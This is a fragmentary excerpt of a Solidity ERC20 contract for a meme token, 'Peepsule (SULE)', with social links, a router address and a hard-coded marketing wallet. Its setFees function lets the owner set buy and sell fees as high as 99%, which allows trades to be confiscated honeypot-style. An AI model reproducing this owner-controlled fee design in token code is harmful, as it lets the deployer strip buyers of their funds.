...
/**
Name: Peepsule (SULE)
TG: https://t.me/peepsuleofficial
Website: https://peepsule.com/
*/
...
contract Peepsule is ERC20, Ownable {
    using SafeMath for uint256;
    address routerAdress = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address DEAD = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Peepsule";
    string constant _symbol = "SULE";
    ...
    address public marketingFeeReceiver = 0x62017049268fbf64104064a27748fef95a88B1F0;
    ...
    function setFees(uint256 _MarketingFee, uint256 _liquidityFee, uint256 _sellLiquidityFee, uint256 _sellMarketingFee) external onlyOwner {
         ...
         require(totalFee <= 99 && totalSellFee <= 99, "Must keep fees at 99% or less");
    }
